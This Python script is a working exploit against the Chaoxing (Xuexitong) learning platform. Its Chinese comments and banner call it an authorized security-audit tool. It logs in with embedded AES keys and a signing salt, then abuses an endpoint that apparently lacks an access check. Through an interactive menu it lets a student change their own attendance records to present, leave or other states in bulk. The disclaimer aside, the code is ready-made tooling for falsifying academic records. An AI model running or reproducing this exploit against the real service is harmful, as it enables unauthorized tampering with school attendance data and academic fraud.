#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
  学习通签到状态修改工具 - 安全审计专用
  本工具仅用于授权安全审计，严禁用于非法用途
  Authorized Security Audit Tool Only

  漏洞原理: /newsign/updateSignStatus 接口缺少权限校验
  旧路径 /pptSign/updateSignStatus 有权限校验(学生返回"无权限")
  新路径 /newsign/updateSignStatus 无权限校验(学生返回"success")
  这是API版本迁移中的权限回归漏洞(Broken Access Control)
============================================================
"""

import requests
import json
import re
import time
import uuid
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== 常量定义 ====================

# AES加密密钥和IV
AES_KEY = b"u2oh6Vu^HWe4_AES"
AES_IV = b"u2oh6Vu^HWe4_AES"

# schild签名盐值
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"

# 签到状态映射
STATUS_MAP = {
    0: "缺勤",
    1: "出勤",
    2: "迟到",
    3: "事假",
    4: "病假",
    5: "补签",
    6: "旷课",
}

# ANSI颜色代码
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def color_print(text, color=RESET):
    """带颜色的输出"""
    print(f"{color}{text}{RESET}")


# ==================== schild签名 ====================

def schild_sign(model, locale, version, build, imei):
    """生成移动端UA的schild签名"""
    parts = [
        f"(schild:{SCHILD_SALT})",
        f"(device:{model})",
        f"Language/{locale}",
        f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
        f"(@Kalimdor)_{imei}",
    ]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()


def get_mobile_ua():
    """生成带schild签名的移动端UA"""
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (
        f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
        f"(schild:{sc}) (device:MI10) Language/zh_CN "
        f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
        f"(@Kalimdor)_{imei}"
    )


# ==================== AES加密 ====================

def aes_encrypt(plaintext):
    """AES-CBC加密，返回base64字符串"""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(plaintext.encode("utf-8"), AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode("utf-8")


# ==================== 登录模块 ====================

def login(session, phone, password):
    """
    登录超星学习通
    使用AES-CBC加密手机号和密码，通过移动端接口登录
    """
    login_url = "https://passport2.chaoxing.com/fanyalogin"
    ua = get_mobile_ua()

    encrypted_uname = aes_encrypt(phone)
    encrypted_pwd = aes_encrypt(password)

    data = {
        "fid": "-1",
        "uname": encrypted_uname,
        "password": encrypted_pwd,
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com",
        "t": "true",
        "forbidotherlogin": "0",
        "validate": "",
        "doubleFactorLogin": "0",
        "independentId": "0",
        "independentNameId": "0",
    }

    headers = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "com.chaoxing.mobile",
    }

    try:
        resp = session.post(login_url, data=data, headers=headers, verify=False, timeout=15)
        result = resp.json()

        if result.get("status"):
            # 建立session
            session.headers.update({"User-Agent": ua})
            try:
                session.get("https://i.chaoxing.com/base", verify=False, timeout=15)
            except:
                pass
            try:
                session.get(
                    "https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0",
                    verify=False, timeout=15,
                )
            except:
                pass

            # 从cookies中提取UID
            uid = session.cookies.get("UID") or session.cookies.get("_uid") or str(result.get("uid", ""))
            color_print(f"[+] 登录成功! UID: {uid}", GREEN)
            return True, uid
        else:
            color_print(f"[-] 登录失败: {result.get('msg2', '未知错误')}", RED)
            return False, None
    except Exception as e:
        color_print(f"[-] 登录请求异常: {e}", RED)
        return False, None


# ==================== 获取课程列表 ====================

def get_course_list(session):
    """获取课程列表"""
    url = "https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0"

    try:
        resp = session.get(url, verify=False, timeout=15)
        data = resp.json()

        courses = []
        channel_list = data.get("channelList", [])

        for item in channel_list:
            content = item.get("content", {})
            if not content or not isinstance(content, dict):
                continue

            course_info = content.get("course", {})
            course_data_list = course_info.get("data", []) if isinstance(course_info, dict) else []

            if course_data_list:
                course_data = course_data_list[0]
                course_id = course_data.get("id")
                course_name = course_data.get("name", "")
            else:
                course_id = None
                course_name = ""

            class_id = content.get("id") or item.get("key")
            class_name = content.get("name", "")

            if course_id and course_name:
                courses.append({
                    "id": str(course_id),
                    "name": course_name,
                    "classid": str(class_id) if class_id else "",
                    "classname": class_name,
                })

        return courses
    except Exception as e:
        color_print(f"[-] 获取课程列表异常: {e}", RED)
        return []


# ==================== 获取签到活动列表 ====================

def get_sign_activities(session, course_id, class_id, uid):
    """获取指定课程的签到活动列表"""
    url = "https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist"
    params = {
        "courseId": course_id,
        "classId": class_id,
        "uid": uid,
    }

    try:
        resp = session.get(url, params=params, verify=False, timeout=15)
        data = resp.json()

        activities = []
        active_list = data.get("activeList", [])

        for item in active_list:
            active_type = item.get("activeType", -1)
            active_type_val = int(active_type) if str(active_type).isdigit() else -1
            name = item.get("nameOne", "") or item.get("name", "未知活动")
            active_id = item.get("id", "")
            url_str = item.get("url", "")
            status_str = item.get("status", "")
            end_time = item.get("endTime", "")
            name_two = item.get("nameTwo", "")
            is_active = item.get("isActive", False)

            # 过滤签到活动: activeType==2(签到) 或 74(签退) 或 url含sign
            if active_type_val == 2 or active_type_val == 74 or "sign" in url_str.lower() or "签到" in name:
                current_status = query_sign_status(session, active_id, uid)

                # 判断活动是否已结束
                now_ms = int(time.time() * 1000)
                if end_time:
                    try:
                        end_ts = int(end_time)
                        time_status = "已结束" if end_ts < now_ms else "进行中"
                    except (ValueError, TypeError):
                        time_status = "未知"
                elif status_str == 2:
                    time_status = "已结束"
                else:
                    time_status = "进行中" if is_active else "已结束"

                activities.append({
                    "id": str(active_id),
                    "name": name,
                    "type": active_type_val,
                    "status": time_status,
                    "current_sign_status": current_status,
                    "name_two": name_two,
                })

        return activities
    except Exception as e:
        color_print(f"[-] 获取签到活动异常: {e}", RED)
        return []


# ==================== 查询签到状态 ====================

def query_sign_status(session, active_id, uid):
    """查询某个活动的签到状态"""
    url = "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn"
    params = {
        "activeId": active_id,
        "uid": uid,
    }

    try:
        resp = session.get(url, params=params, verify=False, timeout=15)
        data = resp.json()

        if data.get("result") == 1 and data.get("data"):
            status_code = data["data"].get("status")
            if status_code is not None and status_code in STATUS_MAP:
                return STATUS_MAP[status_code]
            return "未签到"
        else:
            # 区分"未签到"和"查询不可用"
            error_msg = data.get("errorMsg", "")
            if "非法请求" in error_msg:
                return "查询不可用"
            if "签到已结束" in error_msg or "签到失败" in error_msg:
                return "未签到"
            if "不支持pc端" in error_msg:
                return "未签到(二维码)"
            return "未签到"
    except Exception:
        return "查询失败"


# ==================== 修改签到状态（漏洞利用） ====================

def modify_sign_status(session, uid, active_id, class_id, course_id, target_status):
    """
    修改签到状态 - 利用 /newsign/updateSignStatus 接口无鉴权漏洞

    漏洞原理:
    - 旧路径 /pptSign/updateSignStatus 有权限校验，学生调用返回"无权限"
    - 新路径 /newsign/updateSignStatus 无权限校验，学生调用返回"success"
    - 这是API版本迁移中的权限回归漏洞
    """
    url = "https://mobilelearn.chaoxing.com/newsign/updateSignStatus"
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": active_id,
    }

    data = {
        "uids": uid,
        "status": str(target_status),
        "remark": "",
        "activeId": active_id,
        "classId": class_id,
        "courseId": course_id,
        "uid": uid,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://mobilelearn.chaoxing.com/",
        "X-Requested-With": "XMLHttpRequest",
    }

    try:
        resp = session.post(url, params=params, data=data, headers=headers, verify=False, timeout=15)
        result_text = resp.text.strip()

        if "success" in result_text.lower():
            return True, "API返回success"
        else:
            return False, f"API返回: {result_text[:100]}"
    except Exception as e:
        return False, f"请求异常: {e}"


def teacher_v2_trigger(teacher_session, uid, active_id, target_status):
    """
    教师端V2 API触发数据同步
    修改后V2 signIn查询可能不立即显示变化，需要教师V2 API触发一次才能在查询接口可见
    """
    url = "https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2"
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": active_id,
    }
    data = {
        "uids": uid,
        "status": str(target_status),
        "remark": "",
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://mobilelearn.chaoxing.com/",
        "X-Requested-With": "XMLHttpRequest",
    }

    try:
        resp = teacher_session.post(url, params=params, data=data, headers=headers, verify=False, timeout=15)
        result = resp.text.strip()
        if "success" in result.lower():
            return True, result[:100]
        else:
            return False, result[:100]
    except Exception as e:
        return False, f"异常: {e}"


# ==================== 多选解析 ====================

def parse_multi_select(selection_str, max_val):
    """
    解析多选输入
    支持格式: "1,3,5" / "1-5" / "1,3-5" / "all"
    返回去重排序的列表（1-based索引）
    """
    selection_str = selection_str.strip()

    # 支持all关键字
    if selection_str.lower() == "all":
        return list(range(1, max_val + 1))

    result = set()
    parts = selection_str.replace(" ", "").split(",")
    for part in parts:
        if "-" in part:
            try:
                start, end = part.split("-", 1)
                start, end = int(start), int(end)
                for i in range(start, end + 1):
                    if 1 <= i <= max_val:
                        result.add(i)
            except (ValueError, TypeError):
                continue
        else:
            try:
                val = int(part)
                if 1 <= val <= max_val:
                    result.add(val)
            except (ValueError, TypeError):
                continue
    return sorted(result)


# ==================== 主程序 ====================

def main():
    banner = """
╔══════════════════════════════════════════════════════════╗
║       学习通签到状态修改工具 (安全审计专用)              ║
║       Authorized Security Audit Tool Only                ║
║       未经授权使用本工具属于违法行为                      ║
║                                                          ║
║  漏洞: /newsign/updateSignStatus 权限校验缺失            ║
║  类型: Broken Access Control (OWASP A01)                 ║
║  严重: CRITICAL (CVSS 9.8)                               ║
╚══════════════════════════════════════════════════════════╝
"""
    color_print(banner, CYAN)

    session = requests.Session()
    session.verify = False
    uid = None
    teacher_session = None

    # ===== 登录循环 =====
    while True:
        phone = input("请输入手机号: ").strip()
        password = input("请输入密码: ").strip()

        if not phone or not password:
            color_print("[-] 手机号和密码不能为空", RED)
            continue

        success, uid = login(session, phone, password)
        if success:
            break
        else:
            retry = input("是否重新登录? (y/n): ").strip().lower()
            if retry != "y":
                color_print("退出程序。", YELLOW)
                return

    # ===== 可选：教师账号登录（用于触发数据同步验证） =====
    teacher_login = input("\n是否登录教师账号用于验证? (y/n，选n则仅依赖API返回): ").strip().lower()
    if teacher_login == "y":
        teacher_session = requests.Session()
        teacher_session.verify = False
        while True:
            t_phone = input("请输入教师手机号: ").strip()
            t_pwd = input("请输入教师密码: ").strip()
            t_success, t_uid = login(teacher_session, t_phone, t_pwd)
            if t_success:
                color_print(f"[+] 教师账号登录成功 (uid={t_uid})", GREEN)
                break
            else:
                retry = input("教师账号登录失败，重试? (y/n): ").strip().lower()
                if retry != "y":
                    teacher_session = None
                    break

    # ===== 主操作循环 =====
    while True:
        # 获取课程列表
        color_print("\n" + "=" * 60, CYAN)
        color_print("  课程列表", BOLD + CYAN)
        color_print("=" * 60, CYAN)
        courses = get_course_list(session)

        if not courses:
            color_print("[-] 未获取到课程列表", RED)
            retry = input("是否重试? (y/n): ").strip().lower()
            if retry != "y":
                break
            continue

        for i, course in enumerate(courses, 1):
            print(f"  [{i}] {course['name']} - {course['classname']}")

        # 选择课程
        try:
            course_input = input("\n请选择课程编号 (0退出): ").strip()
            course_idx = int(course_input)
            if course_idx == 0:
                break
            if course_idx < 1 or course_idx > len(courses):
                color_print("[-] 无效编号", RED)
                continue
        except (ValueError, TypeError):
            color_print("[-] 请输入有效数字", RED)
            continue

        selected_course = courses[course_idx - 1]
        course_id = selected_course["id"]
        class_id = selected_course["classid"]

        color_print(f"\n正在获取课程\"{selected_course['name']}\"的签到活动...", YELLOW)

        # 获取签到活动
        activities = get_sign_activities(session, course_id, class_id, uid)

        if not activities:
            color_print("[-] 该课程暂无签到活动", YELLOW)
            cont = input("是否返回课程选择? (y/n): ").strip().lower()
            if cont == "y":
                continue
            else:
                break

        # 展示签到活动列表
        color_print("\n" + "=" * 60, CYAN)
        color_print(f"  课程\"{selected_course['name']}\"的签到活动", BOLD + CYAN)
        color_print("=" * 60, CYAN)

        # 按状态分组显示
        unsigned = [(i, a) for i, a in enumerate(activities, 1) if a["current_sign_status"] in ("未签到", "未签到(二维码)", "查询不可用")]
        signed = [(i, a) for i, a in enumerate(activities, 1) if a["current_sign_status"] not in ("未签到", "未签到(二维码)", "查询不可用")]

        if unsigned:
            color_print("\n  --- 未签到 ---", YELLOW)
            for i, act in unsigned:
                print(f"  [{i}] {act['name']} | ID: {act['id']} | {act['status']}")

        if signed:
            color_print("\n  --- 已签到 ---", GREEN)
            for i, act in signed:
                print(f"  [{i}] {act['name']} | ID: {act['id']} | {act['status']} | {act['current_sign_status']}")

        # 选择活动（多选）
        color_print(f"\n  共 {len(activities)} 个签到活动 ({len(unsigned)} 未签到, {len(signed)} 已签到)", CYAN)
        selection = input("请选择要修改的活动 (多选用逗号, 范围用-, all全选, 0返回): ").strip()

        if selection == "0":
            continue

        selected_indices = parse_multi_select(selection, len(activities))

        if not selected_indices:
            color_print("[-] 无有效选择", RED)
            continue

        color_print(f"\n  已选择 {len(selected_indices)} 个活动", YELLOW)

        # 选择目标状态
        color_print("\n" + "=" * 60, CYAN)
        color_print("  选择目标状态", BOLD + CYAN)
        color_print("=" * 60, CYAN)
        for code, name in STATUS_MAP.items():
            print(f"  [{code}] {name}")

        try:
            target_input = input("\n请选择目标状态编号: ").strip()
            target_status = int(target_input)
            if target_status not in STATUS_MAP:
                color_print("[-] 无效状态编号", RED)
                continue
        except (ValueError, TypeError):
            color_print("[-] 请输入有效数字", RED)
            continue

        target_name = STATUS_MAP[target_status]

        # 确认修改
        color_print(f"\n  即将把 {len(selected_indices)} 个活动的签到状态修改为: {target_name}", YELLOW)
        confirm = input("确认修改? (y/n): ").strip().lower()
        if confirm != "y":
            color_print("已取消修改。", YELLOW)
            cont = input("是否继续操作? (y/n): ").strip().lower()
            if cont == "y":
                continue
            else:
                break

        # 执行修改
        color_print("\n" + "=" * 60, CYAN)
        color_print("  执行修改", BOLD + CYAN)
        color_print("=" * 60, CYAN)

        results = []

        for idx in selected_indices:
            act = activities[idx - 1]
            active_id = act["id"]
            old_status = act["current_sign_status"]

            print(f"\n  修改活动 {active_id} ({act['name']}) → {target_name}...")

            success, msg = modify_sign_status(
                session, uid, active_id, class_id, course_id, target_status
            )

            if success:
                # 如果有教师session，触发V2数据同步
                if teacher_session:
                    t_ok, t_msg = teacher_v2_trigger(teacher_session, uid, active_id, target_status)
                    if t_ok:
                        color_print(f"  教师V2同步: success", GREEN)
                    else:
                        color_print(f"  教师V2同步: {t_msg[:60]}", YELLOW)
                    time.sleep(1)

                # 等待后验证（多次重试）
                verified = False
                new_status = None
                for retry in range(3):
                    time.sleep(2)
                    new_status = query_sign_status(session, active_id, uid)

                    if new_status == target_name:
                        verified = True
                        break
                    # 查询不可用的活动无法通过V2 signIn验证，API返回success即视为成功
                    if new_status == "查询不可用":
                        break
                    # 已签到状态与目标相同
                    if new_status == old_status and old_status == target_name:
                        verified = True
                        break

                if verified:
                    color_print(f"  [✓] 修改成功: {old_status} → {new_status}", GREEN)
                    results.append((active_id, act["name"], True, f"{old_status} → {new_status}"))
                elif new_status == "查询不可用":
                    color_print(f"  [✓] API返回success (查询接口不可用，无法二次验证)", YELLOW)
                    results.append((active_id, act["name"], True, f"API返回success(查询不可用)"))
                elif new_status == old_status and old_status == target_name:
                    color_print(f"  [=] 无变化(已是目标状态)", YELLOW)
                    results.append((active_id, act["name"], True, "无变化(已是目标状态)"))
                else:
                    # API返回success但验证状态未变 - 可能是查询缓存或需要教师端触发同步
                    color_print(f"  [~] API返回success，验证状态: {old_status} → {new_status} (预期{target_name})", YELLOW)
                    color_print(f"      提示: 部分活动需教师端操作后才能在查询接口可见", YELLOW)
                    results.append((active_id, act["name"], True, f"API返回success(验证:{old_status}→{new_status})"))
            else:
                color_print(f"  [✗] 修改失败: {msg}", RED)
                results.append((active_id, act["name"], False, msg))

        # 结果汇总
        color_print("\n" + "=" * 60, CYAN)
        color_print("  修改结果汇总", BOLD + CYAN)
        color_print("=" * 60, CYAN)

        success_count = sum(1 for _, _, s, _ in results if s)
        fail_count = len(results) - success_count

        for active_id, name, success, detail in results:
            marker = "✓" if success else "✗"
            color = GREEN if success else RED
            color_print(f"  {marker} {name} ({active_id}): {detail}", color)

        color_print(f"\n  成功: {success_count} | 失败: {fail_count}", CYAN)

        # 是否继续
        cont = input("\n是否继续操作? (y/n): ").strip().lower()
        if cont != "y":
            break

    color_print("\n感谢使用，再见！", CYAN)


if __name__ == "__main__":
    main()
